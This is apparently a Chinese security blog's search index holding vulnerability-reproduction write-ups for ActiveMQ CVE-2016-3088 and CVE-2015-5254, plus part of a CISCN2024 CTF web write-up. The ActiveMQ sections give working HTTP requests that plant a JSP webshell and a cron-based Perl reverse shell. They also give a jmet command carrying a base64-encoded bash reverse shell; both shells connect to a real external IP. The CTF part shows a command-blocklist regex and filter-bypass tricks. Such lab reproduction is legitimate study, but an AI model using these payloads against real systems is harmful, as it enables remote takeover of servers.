<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ActActiveMQ Arbitrary File Write Vulnerability (CVE-2016-3088)</title>
    <url>/2024/05/31/ActActiveMQ-Arbitrary-File-Write-Vulnerability-CVE-2016-3088/</url>
    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>

<h1 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h1><p>5,14.0之前的版本</p>
<p>5.12.x~5.13.x:需要开启fileserver应用(此应用默认关闭)</p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷。</p>
<p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
<h1 id="漏洞详细"><a href="#漏洞详细" class="headerlink" title="漏洞详细"></a>漏洞详细</h1><p>既然可以写入文件并且可以移动，那就会有下面四种方法，不过只能复现成功前两种，看了很多文章3,4好像也没什么人复现出来，而p神也只留下一句话：理论上可以，但尚未测试。。。。。。。。有种费马解费马大定理的美，然后我自己的功力当然也是做不到了的</p>
<ol>
<li>写入webshell</li>
<li>写入cron</li>
<li>写入jar或jetty.xml等库和配置文件</li>
<li>写入ssh key</li>
</ol>
<h1 id="知识点学习"><a href="#知识点学习" class="headerlink" title="知识点学习"></a>知识点学习</h1><h2 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>PUT</code> 请求用于向服务器更新指定资源，可以理解为对服务器上的资源进行修改操作。使用 <code>PUT</code> 请求方式会覆盖原有的资源内容，因此需要谨慎使用。</p>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>本地一直没弄成功,PUT方法是一直被锁的</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531142351189.png"  alt="image-20240531142351189"></p>
<p><a class="link"   href="https://www.cnblogs.com/kuoaidebb/p/4466602.html" >HTTP - PUT 上传文件&#x2F;Shell - 阔爱的贝贝 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>不过这put虽说可以上传，但是上传的目录是被锁死的，只要这个目录里不解析webshell也没辙，主要是这个Move有点伤</p>
<h2 id="Move请求"><a href="#Move请求" class="headerlink" title="Move请求"></a>Move请求</h2><p><a class="link"   href="https://http-statuscode.com/zh/method/MOVE" >HTTP 方法: MOVE (http-statuscode.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>重要参数Destination</p>
<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>linux上的定时任务</p>
<p><a class="link"   href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" >Linux Crontab 定时任务 | 菜鸟教程 (runoob.com)<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240531151440878.png"  alt="image-20240531151440878"></p>
<p>每隔一分钟复制1.txt成2.txt到根目录，当然这个命令只能执行一次，因为不能同名吧，我主要想实验是发起任务的那一刻开启做，还是一分钟后开始做</p>
<p>使用crontab命令是把定时任务设置在&#x2F;tmp&#x2F;crontab里的，名字随机，不好推出了并且写入</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152305281.png"  alt="image-20240531152305281"></p>
<p>所以我们找到可以直接写入的<code>/etc/cron.d</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531152513931.png"  alt="image-20240531152513931"></p>
<p>有三个用户，一般使用root用户</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>开日</p>
<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240531155110593.png"  alt="image-20240531155110593"></p>
<p>弱口令爆破admin&#x2F;admin</p>
<p>访问已经站点<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>信息收集</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531155345986.png"  alt="image-20240531155345986"></p>
<p>我们只需要两个信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activemq.base	/opt/activemq  #网站根目录，会解析jsp木马文件</span><br><span class="line">user.name	root               #/etc/cron.d目录所有者是root，若这里不是root估计打不成功</span><br></pre></td></tr></table></figure>

<p>接着我们向fileserver上传文件</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>779</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">&lt;%!</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">class</span> U <span class="keyword">extends</span> ClassLoader &#123;</span></span><br><span class="line"><span class="language-gradle">U(ClassLoader c) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">super</span>(c);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">Class</span> g(<span class="keyword">byte</span>[] b) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"> </span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.<span class="keyword">class</span>).invoke(clazz.newInstance(), str);</span></span><br><span class="line"><span class="language-gradle">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="keyword">null</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.<span class="keyword">class</span>).invoke(decoder, str);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle">String cls = request.getParameter(<span class="string">&quot;ewoji&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>

<p>记住后缀不能是jsp</p>
<p>接着Move</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/ewoji.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 13 Feb 2015 17:54:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功将木马打入</p>
<p>注意这里ewoji.txt一定要和ewoji.jsp前缀名字相同，不然会把ewoji.jsp视为一个文件，fileserver会异常关闭，就打不了了呀</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531215835511.png"  alt="image-20240531215835511"></p>
<p>antsword启动</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161710100.png"  alt="image-20240531161710100"></p>
<p>需要admin权限，记得加请求头</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531161641254.png"  alt="image-20240531161641254"></p>
<p>getshell !!!!</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240531221257330.png"  alt="image-20240531221257330"></p>
<h2 id="写入crontab"><a href="#写入crontab" class="headerlink" title="写入crontab"></a>写入crontab</h2><p>大致和上面的一样，就是不用登录</p>
<p>上传</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>250</span><br><span class="line"></span><br><span class="line"><span class="language-tcl">*/<span class="number">1</span> * * * * root /usr/bin/perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;47.100.177.241&quot;</span>;<span class="variable">$p</span>=<span class="number">23333</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240606143921794.png"  alt="image-20240606143921794"></p>
<p>如果是用bp，请确保正文最后是\n而不是\r\n</p>
<p>移动</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ewoji1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///etc/cron.d/root</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.0.2:8161</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>

<p>等待一下</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240606144408059.png"  alt="image-20240606144408059"></p>
<p>getshell !!!</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.对上传的文件内容进行检测</p>
<p>2.限制move方法</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>ActActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ反序列化漏洞(CVE-2015-5254)</title>
    <url>/2024/05/30/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-5254/</url>
    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是漏洞复现第一章了吧</p>
<p>目标:</p>
<p>· 看这些大漏洞在实际的应用</p>
<p>· 品味吸收发现漏洞和挖掘漏洞的过程</p>
<p>· 修复漏洞</p>
<p>· 思维发散，思考有没有其他地方会有同样的漏洞</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache ActiveMQ 5.x ~ Apache ActiveMQ 5.13.0</p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。本质上还是对JMS的攻击，ActiveMQ不过是一个触发反序列化的跳板。</p>
<p>有关JMS Attack的文章：</p>
<p><a class="link"   href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" >us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf (blackhat.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>上一篇的翻译</p>
<p><a class="link"   href="https://www.anquanke.com/post/id/84954" >【技术分享】使用反序列化漏洞干掉你的JMS-安全客 - 安全资讯平台 (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>在发送object消息时的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//send</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendObjectMessage</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    jmsTemplate.send(<span class="keyword">new</span> <span class="title class_">MessageCreator</span>() &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> Message <span class="title function_">createMessage</span><span class="params">(Session session)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Staff</span>(<span class="number">1</span>, <span class="string">&quot;搬砖工&quot;</span>); <span class="comment">// Staff必须实现序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(staff);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//receive</span></span><br><span class="line"> <span class="comment">// 如果是Object消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> ObjectMessage) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="type">ObjectMessage</span> <span class="variable">om</span> <span class="operator">=</span> (ObjectMessage) message;</span><br><span class="line"></span><br><span class="line">      <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> (Staff) om.getObject();</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;ConsumerService从队列&quot;</span> + destination.toString() + <span class="string">&quot;收到了消息：\t&quot;</span> + staff);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>又到了我们最喜欢的getObject()环节</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530143111195.png"  alt="image-20240530143111195"></p>
<p>由于ActiveMQ的调试的debug有点复杂，也没来得及看源码</p>
<p>不过如果你作为挖掘者，在知道以上信息的情况下，一定会源码都不用看，就应该合理猜测在ActiveMQ管理界面中接受消息，就等于执行了以上的receive代码吧，其实真的也不是我懒啦，这确实不用看，直接去试一波就好</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>先用nmap扫扫</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151309225.png"  alt="image-20240530151309225"></p>
<p>发现了61616端口扫出是apachemq的发出端口，不知道为什么管理的端口没扫出来（pass，就当扫出来了）</p>
<p><img   src="/../img/$%7Bfiilename%7D/ok-1717053248889-1.jpg"  alt="ok"></p>
<p>wow，我们成功发现了后台界面(＾－＾)V</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151454795.png"  alt="image-20240530151454795"></p>
<p>什么，居然用admin和admin就登陆进去了（）</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151523882.png"  alt="image-20240530151523882"></p>
<p>居然正是漏洞版本，太巧了吧（</p>
<p>然后我们像接受端口发送信息，然后在在这个界面接受，不就触发了一个反序列化吗</p>
<p>这里需要用到一个工具jmet（查了一下好像就是类似个攻击脚本吧，真好，永远有配套服务）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载jmet的jar包</span><br><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line">#创建external目录，报错让创建的。。。。。。</span><br><span class="line">mkdir external</span><br></pre></td></tr></table></figure>

<p>之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;cp README.txt README1.txt&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170736613.png"  alt="image-20240530170736613"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170748146.png"  alt="image-20240530170748146"></p>
<p>这样就算成功啦，之后反弹shell即可，需要编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTc3LjI0MS8yMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240530171632750.png"  alt="image-20240530171632750"></p>
<p>getshell  !!!!!</p>
<h1 id="修复漏洞"><a href="#修复漏洞" class="headerlink" title="修复漏洞"></a>修复漏洞</h1><p>1.拒绝反序列化危险的类</p>
<p>2.解决前台弱口令问题</p>
<p>3.隐藏接受信息的端口</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>ActActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2024-web复现</title>
    <url>/2024/05/21/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="初遇国赛"><a href="#初遇国赛" class="headerlink" title="初遇国赛"></a>初遇国赛</h1><span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次打国赛，难度还是很大的，一题做一天唉，如图所示(2&#x2F;6)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240521223322525.png"  alt="image-20240521223322525"></p>
<p>说实话我认为我能做四题的，第一天一直在看Simple_php，最后十分钟打出来了，打得我都发抖了，然后第二天才开始看的cms，星期天刚刚到实验室打开电脑就看到大B哥捷报传来</p>
<p><img   src="/../img/$%7Bfiilename%7D/2ea692c2a181a4ef0ae6828c46b8f539.jpg"  alt="2ea692c2a181a4ef0ae6828c46b8f539"></p>
<p>五分钟拿下一血，你知道的，大b哥依旧这么强。</p>
<p>之后就开始了漫长的坐牢生活，一直审源码审到三点才做了出来</p>
<p>最后实在太累了，有种想死的无力感，随便打开题看看，开了个mossfen，给了源码一看，就知道是python沙盒栈帧逃逸，在中国海洋大学新生赛写过，但是没写出来，赛后也没看，好像考试前看过原题但是记不起来的感觉，最后实在累了，懒得看了。最后两个小时就随便看看密码和杂项（虽然一个没打出来就是了）</p>
<p>赛后水了水群，才知道mossfen这题和中海大的菜鸟工具2确实是同一个出题人，于是我痛定思痛，每次比赛后都要好好复现，所以便有了这篇文章</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240521224229311.png"  alt="image-20240521224229311"></p>
<p>HnuSec_5拿了个校内队第5，很会预言的名字，这使我大脑旋转</p>
<p><img   src="/../img/$%7Bfiilename%7D/ok.jpg"  alt="ok"></p>
<h1 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span>      (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很干练的一题rce，没有整活，你执行不了都不给你个回显</p>
<p>这边开局看到了<code>escapeshelllcmd()</code>，于是上网查，并且搜索相关绕过和漏洞，学到了一下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当$cmd中包含‘&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A 和 \xFF’任意一个，这个函数都会在前面加个转义字符，为什么会这样呢，因为这些东西在linux命令行中都是特别的存在，允许我们玩很多绕过的花招</span><br><span class="line">&amp;:可当命令的分隔符，也可以与&gt;&lt;组成重定向的文件合并，比如我们常见的反弹shell</span><br><span class="line">#:linux命令行的注释符(终止符)</span><br><span class="line">;:分隔符</span><br><span class="line">`:`cat flag`=&gt;flag&#123;ewoji_0000_114614&#125;</span><br><span class="line">|:隔开两个命令，并把上一个命令的输出当作下个命令的输入,ls | grep &#x27;flag&#x27;</span><br><span class="line">*:匹配任意个数任意字符fla?.php</span><br><span class="line">?:匹配一个任意字符f*</span><br><span class="line">~:cd ~切换到home目录</span><br><span class="line">&lt;&gt;:重定向符,可以使用cat&lt;flag.php绕过空格</span><br><span class="line">^:未知，似乎没找到什么有用的</span><br><span class="line">():无需多言</span><br><span class="line">[]:[A-Za-z0-9]表示所有字符数字，[a-c]表示abc,[-%] ”代表“ [!”#$%] </span><br><span class="line">&#123;&#125;:&#123;e,w,o,j,i&#125;可表示里面的任意字符，这个非常好用，[]只能在参数部分匹配，而&#123;&#125;甚至可以在命令部分匹配</span><br><span class="line"></span><br><span class="line">$:1.可以表示一个变量，作变量拼接a=f;b=l;c=a;d=g,$a$b$c$d=flag</span><br><span class="line">  2.可以表示一个空变量绕过空格,$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:wh$1oami,who$@ami,whoa$*mi</span><br><span class="line">  3.可以看一些环境变量,echo $PATH,echo $SHELL</span><br><span class="line">  4.可以配合&#123;&#125;截取字母，如$&#123;PATH:5:1&#125;=&gt;l($PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line">  </span><br><span class="line">\x0A:换行符</span><br><span class="line">\xFF:不明白的神秘符号</span><br></pre></td></tr></table></figure>

<p>咳咳，然后呢，搜了一大堆相关漏洞，什么宽字节都出来了，还是打不通，索性从绕过这个函数放弃</p>
<p>然后望着一望无际的disable_functions思考人生</p>
<p>一直在思考这个转义字符能有什么用，于是我开启了第一波尝试</p>
<p>payload:<code>php -r var_dump(1);</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240522125934038.png"  alt="image-20240522125934038"></p>
<p>执行了？为什么？</p>
<p><a class="link"   href="https://www.cnblogs.com/jycjy/p/6937667.html" >Shell命令行中特殊字符与其转义详解(去除特殊含义) - 酸奶加绿茶 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>一个命令的执行应该包括 命令+选项+参数，且顺序不能变</p>
<p>就好比你<code>ls &gt; test.txt</code>可以成功而<code>test.txt &lt; ls</code>会报错说没有ls这个文件</p>
<p>命令和选项按顺序填好后，就是参数了，参数不是特殊字符，当参数包含特殊字符时需要转义</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240522131043137.png"  alt="image-20240522131043137"></p>
<p>执行了两个不同的命令，取决于&amp;有没有被转义，这里我用了’’去转义&amp;，你也可以使用””或\去转义</p>
<p>这样就可以解释了我的 <code>php -r var_dump\(1\)\;</code>为什么执行了，特殊字符被转义，实际上执行的就是<code>php -r var_dump(1)</code></p>
<p><strong>所以说有时候限制我们的，换个角度看，就可以变成帮助我们的</strong></p>
<p>所以接下来只需要编码绕过disable_functions即可</p>
